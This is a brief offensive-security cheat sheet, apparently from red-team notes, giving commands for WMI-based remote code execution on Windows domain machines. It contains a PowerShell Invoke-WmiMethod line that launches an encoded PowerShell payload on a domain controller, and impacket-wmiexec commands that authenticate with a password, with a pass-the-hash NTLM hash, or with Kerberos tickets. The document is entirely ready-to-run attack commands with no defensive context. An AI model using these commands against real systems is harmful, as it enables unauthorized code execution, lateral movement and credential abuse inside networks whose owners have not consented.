_Requires ‘Host’ and ‘RPCSS’ SPNs_
#### From Windows

```powershell
Invoke-WmiMethod win32_process -ComputerName dc.targetdomain.com -name create -argumentlist "powershell.exe -e $encodedCommand"
```
#### From Linux

```bash
# with password
impacket-wmiexec DOMAIN/targetuser:password@172.16.4.101

# with hash
impacket-wmiexec DOMAIN/targetuser@172.16.4.101 -hashes :e0e223d63905f5a7796fb1006e7dc594

# with Kerberos authentication (make sure your client is setup to use the right ticket, and that you have a TGS with the right SPNs)
impacket-wmiexec DOMAIN/targetuser@172.16.4.101 -no-pass -k
```